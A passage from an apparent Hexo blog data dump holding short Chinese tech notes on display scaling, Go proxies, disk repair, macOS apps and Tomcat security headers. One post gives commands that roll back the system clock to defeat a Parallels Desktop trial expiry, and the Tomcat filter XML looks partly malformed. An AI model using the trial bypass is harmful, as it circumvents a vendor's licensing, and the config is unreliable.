class=\"line\">Xft.hinting: 1</span><br><span class=\"line\">Xft.antialias: 1</span><br><span class=\"line\">Xft.rgba: rgb</span><br></pre></td></tr></table></figure>\n\n<p>其中 Xft.dpi 尽量为 96 的倍数，以保证最佳显示效果。</p>\n<p>之后重启 <code>X server</code> 或者直接 reboot。</p>\n<h1 id=\"未解决问题\"><a href=\"#未解决问题\" class=\"headerlink\" title=\"未解决问题\"></a>未解决问题</h1><p>使用的 st 终端字体还是小得跟蚂蚁一样，还需要继续查询解决方案。</p>\n","site":{"data":{}},"excerpt":"<p>之前通过一系列配置在 wsl2 上安装了桌面并远程连接过去后，发现桌面缩放不对劲，在我的 4k 屏上显示字体非常小，查了好久资料才看到可以通过配置 <code>X resources</code> 解决。</p>","more":"<p><a href=\"https://zhuanlan.zhihu.com/p/384806450\">Arch Linux - 4k&#x2F;HiDPI 屏 X Window 字体太小</a></p>\n<p>在 <code>~/.Xresources</code> 文件上配置如下内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Xft.dpi: 192</span><br><span class=\"line\"></span><br><span class=\"line\">! These might also be useful depending on your monitor and personal preference:</span><br><span class=\"line\">Xft.autohint: 0</span><br><span class=\"line\">Xft.lcdfilter:  lcddefault</span><br><span class=\"line\">Xft.hintstyle:  hintfull</span><br><span class=\"line\">Xft.hinting: 1</span><br><span class=\"line\">Xft.antialias: 1</span><br><span class=\"line\">Xft.rgba: rgb</span><br></pre></td></tr></table></figure>\n\n<p>其中 Xft.dpi 尽量为 96 的倍数，以保证最佳显示效果。</p>\n<p>之后重启 <code>X server</code> 或者直接 reboot。</p>\n<h1 id=\"未解决问题\"><a href=\"#未解决问题\" class=\"headerlink\" title=\"未解决问题\"></a>未解决问题</h1><p>使用的 st 终端字体还是小得跟蚂蚁一样，还需要继续查询解决方案。</p>"},{"layout":"pages","title":"IDEA配置记录","date":"2022-10-20T14:57:41.000Z","_content":"\n# 设置注释模版\n\n[IDEA 设置注释模板](https://blog.csdn.net/tergou/article/details/122960289)\n","source":"_posts/2022/10/IDEA配置记录.md","raw":"---\nlayout: pages\ntitle: IDEA配置记录\ndate: 2022-10-20 22:57:41\ntags:\n  - 配置\ncategories:\n  - 配置\n---\n\n# 设置注释模版\n\n[IDEA 设置注释模板](https://blog.csdn.net/tergou/article/details/122960289)\n","slug":"2022/10/IDEA配置记录","published":1,"updated":"2022-10-20T14:59:02.956Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj6002nzge309ww3fhy","content":"<h1 id=\"设置注释模版\"><a href=\"#设置注释模版\" class=\"headerlink\" title=\"设置注释模版\"></a>设置注释模版</h1><p><a href=\"https://blog.csdn.net/tergou/article/details/122960289\">IDEA 设置注释模板</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"设置注释模版\"><a href=\"#设置注释模版\" class=\"headerlink\" title=\"设置注释模版\"></a>设置注释模版</h1><p><a href=\"https://blog.csdn.net/tergou/article/details/122960289\">IDEA 设置注释模板</a></p>\n"},{"layout":"pages","title":"SpringBoot项目学习记录","date":"2022-10-20T15:00:38.000Z","_content":"\n验证 SpringBoot 学习记录。\n\n<!--more-->\n\n# API 接口统一格式返回\n\n[Java 如何设计 API 接口，实现统一格式返回？](https://zhuanlan.zhihu.com/p/86875819)\n\n# 全局异常处理\n\n[【第十六篇】Spring Boot 中的全局异常处理](https://blog.csdn.net/weixin_42039228/article/details/123454704)\n","source":"_posts/2022/10/SpringBoot项目学习记录.md","raw":"---\nlayout: pages\ntitle: SpringBoot项目学习记录\ndate: 2022-10-20 23:00:38\ntags:\n  - Java\n  - SpringBoot\ncategories:\n  - Java\n  - SpringBoot\n---\n\n验证 SpringBoot 学习记录。\n\n<!--more-->\n\n# API 接口统一格式返回\n\n[Java 如何设计 API 接口，实现统一格式返回？](https://zhuanlan.zhihu.com/p/86875819)\n\n# 全局异常处理\n\n[【第十六篇】Spring Boot 中的全局异常处理](https://blog.csdn.net/weixin_42039228/article/details/123454704)\n","slug":"2022/10/SpringBoot项目学习记录","published":1,"updated":"2022-10-20T15:05:17.177Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj6002szge38kbc1kiq","content":"<p>验证 SpringBoot 学习记录。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"API-接口统一格式返回\"><a href=\"#API-接口统一格式返回\" class=\"headerlink\" title=\"API 接口统一格式返回\"></a>API 接口统一格式返回</h1><p><a href=\"https://zhuanlan.zhihu.com/p/86875819\">Java 如何设计 API 接口，实现统一格式返回？</a></p>\n<h1 id=\"全局异常处理\"><a href=\"#全局异常处理\" class=\"headerlink\" title=\"全局异常处理\"></a>全局异常处理</h1><p><a href=\"https://blog.csdn.net/weixin_42039228/article/details/123454704\">【第十六篇】Spring Boot 中的全局异常处理</a></p>\n","site":{"data":{}},"excerpt":"<p>验证 SpringBoot 学习记录。</p>","more":"<h1 id=\"API-接口统一格式返回\"><a href=\"#API-接口统一格式返回\" class=\"headerlink\" title=\"API 接口统一格式返回\"></a>API 接口统一格式返回</h1><p><a href=\"https://zhuanlan.zhihu.com/p/86875819\">Java 如何设计 API 接口，实现统一格式返回？</a></p>\n<h1 id=\"全局异常处理\"><a href=\"#全局异常处理\" class=\"headerlink\" title=\"全局异常处理\"></a>全局异常处理</h1><p><a href=\"https://blog.csdn.net/weixin_42039228/article/details/123454704\">【第十六篇】Spring Boot 中的全局异常处理</a></p>"},{"layout":"pages","title":"绕过ParallelsDesktop试用期到期限制启动虚拟机","date":"2022-07-31T15:46:01.000Z","_content":"\n从官网下载的正版 Paralles Desktop 登录后可以试用 14 天，14 天后就不能试用了，上网搜索办法绕过过期限制直接启动已安装的虚拟机。\n\n<!--more-->\n\n找了个配置视频，将这个过程设置为快捷指令的方式来使用，配置好后还挺方便的，当然你要是自己手输命令也不是不可以。\n\n[如何绕过试用期到期限制，正常使用 Parallels Desktop 启动虚拟机](https://www.bilibili.com/video/BV1ev4y1K7qm)\n\n主要的配置脚本如下，感谢各位大佬的教程。\n\n```bash\n# 第一步：将电脑时间设置为你试用期到期之前\nsudo systemsetup -setusingnetworktime Off && sudo systemsetup -setdate 05:14:2022\n\n# 第二步：通过命令直接启动虚拟机\n/usr/local/bin/prlctl start \"YourVmName\"\n\n# 第三步：将电脑时间同步改回去\nsudo systemsetup -setusingnetworktime On\n```\n","source":"_posts/2022/07/绕过ParallelsDesktop试用期到期限制启动虚拟机.md","raw":"---\nlayout: pages\ntitle: 绕过ParallelsDesktop试用期到期限制启动虚拟机\ndate: 2022-07-31 23:46:01\ntags:\n  - 配置\ncategories:\n  - 配置\n---\n\n从官网下载的正版 Paralles Desktop 登录后可以试用 14 天，14 天后就不能试用了，上网搜索办法绕过过期限制直接启动已安装的虚拟机。\n\n<!--more-->\n\n找了个配置视频，将这个过程设置为快捷指令的方式来使用，配置好后还挺方便的，当然你要是自己手输命令也不是不可以。\n\n[如何绕过试用期到期限制，正常使用 Parallels Desktop 启动虚拟机](https://www.bilibili.com/video/BV1ev4y1K7qm)\n\n主要的配置脚本如下，感谢各位大佬的教程。\n\n```bash\n# 第一步：将电脑时间设置为你试用期到期之前\nsudo systemsetup -setusingnetworktime Off && sudo systemsetup -setdate 05:14:2022\n\n# 第二步：通过命令直接启动虚拟机\n/usr/local/bin/prlctl start \"YourVmName\"\n\n# 第三步：将电脑时间同步改回去\nsudo systemsetup -setusingnetworktime On\n```\n","slug":"2022/07/绕过ParallelsDesktop试用期到期限制启动虚拟机","published":1,"updated":"2022-07-31T15:57:12.389Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj6002vzge33dvbhx1i","content":"<p>从官网下载的正版 Paralles Desktop 登录后可以试用 14 天，14 天后就不能试用了，上网搜索办法绕过过期限制直接启动已安装的虚拟机。</p>\n<span id=\"more\"></span>\n\n<p>找了个配置视频，将这个过程设置为快捷指令的方式来使用，配置好后还挺方便的，当然你要是自己手输命令也不是不可以。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1ev4y1K7qm\">如何绕过试用期到期限制，正常使用 Parallels Desktop 启动虚拟机</a></p>\n<p>主要的配置脚本如下，感谢各位大佬的教程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 第一步：将电脑时间设置为你试用期到期之前</span></span><br><span class=\"line\">sudo systemsetup -setusingnetworktime Off &amp;&amp; sudo systemsetup -setdate 05:14:2022</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第二步：通过命令直接启动虚拟机</span></span><br><span class=\"line\">/usr/local/bin/prlctl start <span class=\"string\">&quot;YourVmName&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第三步：将电脑时间同步改回去</span></span><br><span class=\"line\">sudo systemsetup -setusingnetworktime On</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>从官网下载的正版 Paralles Desktop 登录后可以试用 14 天，14 天后就不能试用了，上网搜索办法绕过过期限制直接启动已安装的虚拟机。</p>","more":"<p>找了个配置视频，将这个过程设置为快捷指令的方式来使用，配置好后还挺方便的，当然你要是自己手输命令也不是不可以。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1ev4y1K7qm\">如何绕过试用期到期限制，正常使用 Parallels Desktop 启动虚拟机</a></p>\n<p>主要的配置脚本如下，感谢各位大佬的教程。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 第一步：将电脑时间设置为你试用期到期之前</span></span><br><span class=\"line\">sudo systemsetup -setusingnetworktime Off &amp;&amp; sudo systemsetup -setdate 05:14:2022</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第二步：通过命令直接启动虚拟机</span></span><br><span class=\"line\">/usr/local/bin/prlctl start <span class=\"string\">&quot;YourVmName&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 第三步：将电脑时间同步改回去</span></span><br><span class=\"line\">sudo systemsetup -setusingnetworktime On</span><br></pre></td></tr></table></figure>"},{"layout":"pages","title":"解决go插件下载失败问题","date":"2022-07-24T15:02:34.000Z","_content":"\n国内下载 go 插件会报错，不用梯子只能配置 go mod 代理了。\n\n<!--more-->\n\n直接执行如下的命令就可启用 go mod 代理，这时 vscode 再下载 go 插件就不会报错了。\n\n```bash\ngo env -w GO111MODULE=on\n\ngo env -w GOPROXY=https://proxy.golang.com.cn,direct\n```\n\n# 参考文章\n\n- [一招完美解决 vscode 安装 go 插件失败问题](https://blog.csdn.net/qq_41065919/article/details/107710144)\n","source":"_posts/2022/07/解决go插件下载失败问题.md","raw":"---\nlayout: pages\ntitle: 解决go插件下载失败问题\ndate: 2022-07-24 23:02:34\ntags:\n  - 配置\n  - golang\ncategories:\n  - 配置\n  - golang\n---\n\n国内下载 go 插件会报错，不用梯子只能配置 go mod 代理了。\n\n<!--more-->\n\n直接执行如下的命令就可启用 go mod 代理，这时 vscode 再下载 go 插件就不会报错了。\n\n```bash\ngo env -w GO111MODULE=on\n\ngo env -w GOPROXY=https://proxy.golang.com.cn,direct\n```\n\n# 参考文章\n\n- [一招完美解决 vscode 安装 go 插件失败问题](https://blog.csdn.net/qq_41065919/article/details/107710144)\n","slug":"2022/07/解决go插件下载失败问题","published":1,"updated":"2022-09-26T15:02:40.822Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj7002zzge3emlo0gxo","content":"<p>国内下载 go 插件会报错，不用梯子只能配置 go mod 代理了。</p>\n<span id=\"more\"></span>\n\n<p>直接执行如下的命令就可启用 go mod 代理，这时 vscode 再下载 go 插件就不会报错了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go <span class=\"built_in\">env</span> -w GO111MODULE=on</span><br><span class=\"line\"></span><br><span class=\"line\">go <span class=\"built_in\">env</span> -w GOPROXY=https://proxy.golang.com.cn,direct</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/qq_41065919/article/details/107710144\">一招完美解决 vscode 安装 go 插件失败问题</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>国内下载 go 插件会报错，不用梯子只能配置 go mod 代理了。</p>","more":"<p>直接执行如下的命令就可启用 go mod 代理，这时 vscode 再下载 go 插件就不会报错了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go <span class=\"built_in\">env</span> -w GO111MODULE=on</span><br><span class=\"line\"></span><br><span class=\"line\">go <span class=\"built_in\">env</span> -w GOPROXY=https://proxy.golang.com.cn,direct</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><ul>\n<li><a href=\"https://blog.csdn.net/qq_41065919/article/details/107710144\">一招完美解决 vscode 安装 go 插件失败问题</a></li>\n</ul>"},{"layout":"pages","title":"macOS上的Mounty不能在读写模式下重新挂载硬盘","date":"2022-10-19T14:36:21.000Z","_content":"\nmacOS 上使用 Mounty 重新挂载硬盘时报错，不能重新挂载。\n\n<!--more-->\n\n原因：硬盘先前没有正常卸载（比如我当时是直接拔下硬盘的）。\n\n解决方案：在 Windows 上执行 chkdsk 命令修复硬盘。\n\n```bash\n# i为硬盘的盘符\nchkdsk i: /f\n```\n","source":"_posts/2022/10/macOS上的Mounty不能在读写模式下重新挂载硬盘.md","raw":"---\nlayout: pages\ntitle: macOS上的Mounty不能在读写模式下重新挂载硬盘\ndate: 2022-10-19 22:36:21\ntags:\n  - 配置\n  - macOS\ncategories:\n  - 配置\n  - macOS\n---\n\nmacOS 上使用 Mounty 重新挂载硬盘时报错，不能重新挂载。\n\n<!--more-->\n\n原因：硬盘先前没有正常卸载（比如我当时是直接拔下硬盘的）。\n\n解决方案：在 Windows 上执行 chkdsk 命令修复硬盘。\n\n```bash\n# i为硬盘的盘符\nchkdsk i: /f\n```\n","slug":"2022/10/macOS上的Mounty不能在读写模式下重新挂载硬盘","published":1,"updated":"2022-10-19T14:41:35.013Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj70033zge3af3m52ox","content":"<p>macOS 上使用 Mounty 重新挂载硬盘时报错，不能重新挂载。</p>\n<span id=\"more\"></span>\n\n<p>原因：硬盘先前没有正常卸载（比如我当时是直接拔下硬盘的）。</p>\n<p>解决方案：在 Windows 上执行 chkdsk 命令修复硬盘。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># i为硬盘的盘符</span></span><br><span class=\"line\">chkdsk i: /f</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>macOS 上使用 Mounty 重新挂载硬盘时报错，不能重新挂载。</p>","more":"<p>原因：硬盘先前没有正常卸载（比如我当时是直接拔下硬盘的）。</p>\n<p>解决方案：在 Windows 上执行 chkdsk 命令修复硬盘。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># i为硬盘的盘符</span></span><br><span class=\"line\">chkdsk i: /f</span><br></pre></td></tr></table></figure>"},{"layout":"pages","title":"macOS使用技巧记录","date":"2022-10-19T14:55:57.000Z","_content":"\n在这里记录一些比较好用的东西。\n\n<!--more-->\n\n# App 推荐\n\n- 隐藏刘海：topnotch\n- 菜单栏图标隐藏：hiddenbar（免费），Barbee（App Store）\n- 磁力链接下载器：motrix\n\n# 网站记录\n\n- [macbox.app](https://macbox.app/c/app.html)\n- [M1 Pro and M1 Max Xcode Build and Test Benchmarks](https://blog.swiftpackageindex.com/posts/m1-pro-and-m1-max-build-and-test-benchmarks/)\n\n# 好文收录\n\n- [写给所有 Mac 用户的摸鱼指北](https://sspai.com/post/75805)\n","source":"_posts/2022/10/macOS使用技巧记录.md","raw":"---\nlayout: pages\ntitle: macOS使用技巧记录\ndate: 2022-10-19 22:55:57\ntags:\n  - 配置\n  - macOS\ncategories:\n  - 配置\n  - macOS\n---\n\n在这里记录一些比较好用的东西。\n\n<!--more-->\n\n# App 推荐\n\n- 隐藏刘海：topnotch\n- 菜单栏图标隐藏：hiddenbar（免费），Barbee（App Store）\n- 磁力链接下载器：motrix\n\n# 网站记录\n\n- [macbox.app](https://macbox.app/c/app.html)\n- [M1 Pro and M1 Max Xcode Build and Test Benchmarks](https://blog.swiftpackageindex.com/posts/m1-pro-and-m1-max-build-and-test-benchmarks/)\n\n# 好文收录\n\n- [写给所有 Mac 用户的摸鱼指北](https://sspai.com/post/75805)\n","slug":"2022/10/macOS使用技巧记录","published":1,"updated":"2022-10-20T15:15:48.726Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj70036zge3asce150p","content":"<p>在这里记录一些比较好用的东西。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"App-推荐\"><a href=\"#App-推荐\" class=\"headerlink\" title=\"App 推荐\"></a>App 推荐</h1><ul>\n<li>隐藏刘海：topnotch</li>\n<li>菜单栏图标隐藏：hiddenbar（免费），Barbee（App Store）</li>\n<li>磁力链接下载器：motrix</li>\n</ul>\n<h1 id=\"网站记录\"><a href=\"#网站记录\" class=\"headerlink\" title=\"网站记录\"></a>网站记录</h1><ul>\n<li><a href=\"https://macbox.app/c/app.html\">macbox.app</a></li>\n<li><a href=\"https://blog.swiftpackageindex.com/posts/m1-pro-and-m1-max-build-and-test-benchmarks/\">M1 Pro and M1 Max Xcode Build and Test Benchmarks</a></li>\n</ul>\n<h1 id=\"好文收录\"><a href=\"#好文收录\" class=\"headerlink\" title=\"好文收录\"></a>好文收录</h1><ul>\n<li><a href=\"https://sspai.com/post/75805\">写给所有 Mac 用户的摸鱼指北</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>在这里记录一些比较好用的东西。</p>","more":"<h1 id=\"App-推荐\"><a href=\"#App-推荐\" class=\"headerlink\" title=\"App 推荐\"></a>App 推荐</h1><ul>\n<li>隐藏刘海：topnotch</li>\n<li>菜单栏图标隐藏：hiddenbar（免费），Barbee（App Store）</li>\n<li>磁力链接下载器：motrix</li>\n</ul>\n<h1 id=\"网站记录\"><a href=\"#网站记录\" class=\"headerlink\" title=\"网站记录\"></a>网站记录</h1><ul>\n<li><a href=\"https://macbox.app/c/app.html\">macbox.app</a></li>\n<li><a href=\"https://blog.swiftpackageindex.com/posts/m1-pro-and-m1-max-build-and-test-benchmarks/\">M1 Pro and M1 Max Xcode Build and Test Benchmarks</a></li>\n</ul>\n<h1 id=\"好文收录\"><a href=\"#好文收录\" class=\"headerlink\" title=\"好文收录\"></a>好文收录</h1><ul>\n<li><a href=\"https://sspai.com/post/75805\">写给所有 Mac 用户的摸鱼指北</a></li>\n</ul>"},{"layout":"pages","title":"tomcat配置HTTPS访问","date":"2022-10-04T10:47:40.000Z","_content":"\n话不多说，直接看别人的文章。\n\n[Tomcat 实现 HTTPS 访问](https://www.cnblogs.com/54chensongxia/p/13754839.html)\n","source":"_posts/2022/10/tomcat配置HTTPS访问.md","raw":"---\nlayout: pages\ntitle: tomcat配置HTTPS访问\ndate: 2022-10-04 18:47:40\ntags:\n  - 配置\n  - tomcat\ncategories:\n  - 配置\n  - tomcat\n---\n\n话不多说，直接看别人的文章。\n\n[Tomcat 实现 HTTPS 访问](https://www.cnblogs.com/54chensongxia/p/13754839.html)\n","slug":"2022/10/tomcat配置HTTPS访问","published":1,"updated":"2022-10-04T10:50:01.405Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj7003bzge31c5z5f2l","content":"<p>话不多说，直接看别人的文章。</p>\n<p><a href=\"https://www.cnblogs.com/54chensongxia/p/13754839.html\">Tomcat 实现 HTTPS 访问</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>话不多说，直接看别人的文章。</p>\n<p><a href=\"https://www.cnblogs.com/54chensongxia/p/13754839.html\">Tomcat 实现 HTTPS 访问</a></p>\n"},{"layout":"pages","title":"tomcat配置防止XSS等漏洞","date":"2022-10-04T10:16:02.000Z","_content":"\n现在公司对需要投产的外联应用除了做代码扫描等工作，还需要进行渗透性测试，真的是改得欲仙欲死，最多的就是反射型 XSS 漏洞和存储型 XSS 漏洞了，这里先不表，还有就是需要对部署应用的 tomcat 进行配置，消掉扫出来的头缺失漏洞：X-Frame-Options、X-XSS-Protection、X-Content-Type-Options 头缺失漏洞。\n\n<!--more-->\n\n# 步骤\n\n1. 在 web.xml（`$tomcat/conf/web.xml` or `$project/src/main/webapp/WEB-INF/web.xml`）中配置 filter\n\n```xml\n<filter>\n  <filter-name>httpHeaderSecurity</filter-name>\n  <filter-class>org.apache.catalina.filters.HttpHeaderSecurityFilter</filter-class>\n  <!-- Frame-Options -->\n  <async-supported>true</async-supported>\n  <init-param>\n    <param-name>antiClickJackingEnabled</param-name>\n    <param-value>true</param-value>\n  </init-param>\n  <init-param>\n    <param-name>antiClickJackingOption</param-name>\n    <param-value>SAMEORIGIN</param-value>\n  </init-param>\n  <!-- XSS-Protection -->\n  <xssProtectionEnabled>true</xssProtectionEnabled>\n  <!-- Content-Type-Options -->\n  <BlockContentTypeSniffingEnabled>true</BlockContentTypeSniffingEnabled>\n</filter>\n<filter-mapping>\n  <filter-name>httpHeaderSecurity</filter-name>\n  <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n2. 验证\n\n重启 tomcat 后，在 http 请求中可以看到 返回的 Headers 中包含了\n\n```\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\n```\n\n这样就配置成功了。\n\n# 来源\n\n- [关于网信办的扫描漏洞“X-Frame-Options”，“X-XSS-Protection“等三联漏洞](https://blog.csdn.net/qq_20324305/article/details/117414274)\n","source":"_posts/2022/10/tomcat配置防止XSS等漏洞.md","raw":"---\nlayout: pages\ntitle: tomcat配置防止XSS等漏洞\ndate: 2022-10-04 18:16:02\ntags:\n  - 配置\n  - tomcat\ncategories:\n  - 配置\n  - tomcat\n---\n\n现在公司对需要投产的外联应用除了做代码扫描等工作，还需要进行渗透性测试，真的是改得欲仙欲死，最多的就是反射型 XSS 漏洞和存储型 XSS 漏洞了，这里先不表，还有就是需要对部署应用的 tomcat 进行配置，消掉扫出来的头缺失漏洞：X-Frame-Options、X-XSS-Protection、X-Content-Type-Options 头缺失漏洞。\n\n<!--more-->\n\n# 步骤\n\n1. 在 web.xml（`$tomcat/conf/web.xml` or `$project/src/main/webapp/WEB-INF/web.xml`）中配置 filter\n\n```xml\n<filter>\n  <filter-name>httpHeaderSecurity</filter-name>\n  <filter-class>org.apache.catalina.filters.HttpHeaderSecurityFilter</filter-class>\n  <!-- Frame-Options -->\n  <async-supported>true</async-supported>\n  <init-param>\n    <param-name>antiClickJackingEnabled</param-name>\n    <param-value>true</param-value>\n  </init-param>\n  <init-param>\n    <param-name>antiClickJackingOption</param-name>\n    <param-value>SAMEORIGIN</param-value>\n  </init-param>\n  <!-- XSS-Protection -->\n  <xssProtectionEnabled>true</xssProtectionEnabled>\n  <!-- Content-Type-Options -->\n  <BlockContentTypeSniffingEnabled>true</BlockContentTypeSniffingEnabled>\n</filter>\n<filter-mapping>\n  <filter-name>httpHeaderSecurity</filter-name>\n  <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n2. 验证\n\n重启 tomcat 后，在 http 请求中可以看到 返回的 Headers 中包含了\n\n```\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\n```\n\n这样就配置成功了。\n\n# 来源\n\n- [关于网信办的扫描漏洞“X-Frame-Options”，“X-XSS-Protection“等三联漏洞](https://blog.csdn.net/qq_20324305/article/details/117414274)\n","slug":"2022/10/tomcat配置防止XSS等漏洞","published":1,"updated":"2022-10-04T10:38:08.997Z","comments":1,"photos":[],"link":"","_id":"clyh3xcj8003ezge3gntma5pc","content":"<p>现在公司对需要投产的外联应用除了做代码扫描等工作，还需要进行渗透性测试，真的是改得欲仙欲死，最多的就是反射型 XSS 漏洞和存储型 XSS 漏洞了，这里先不表，还有就是需要对部署应用的 tomcat 进行配置，消掉扫出来的头缺失漏洞：X-Frame-Options、X-XSS-Protection、X-Content-Type-Options 头缺失漏洞。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h1><ol>\n<li>在 web.xml（<code>$tomcat/conf/web.xml</code> or <code>$project/src/main/webapp/WEB-INF/web.xml</code>）中配置 filter</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>httpHeaderSecurity<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-class</span>&gt;</span>org.apache.catalina.filters.HttpHeaderSecurityFilter<span class=\"tag\">&lt;/<span class=\"name\">filter-class</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Frame-Options --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">async-supported</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">async-supported</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>antiClickJackingEnabled<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>antiClickJackingOption<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>SAMEORIGIN<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- XSS-Protection --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">xssProtectionEnabled</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">xssProtectionEnabled</span>&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- Content-Type-Options --&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">BlockContentTypeSniffingEnabled</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">BlockContentTypeSniffingEnabled</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">filter</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">filter-mapping</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">filter-name</span>&gt;</span>httpHeaderSecurity<span class=\"tag\">&lt;/<span class=\"name\">filter-name</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ol 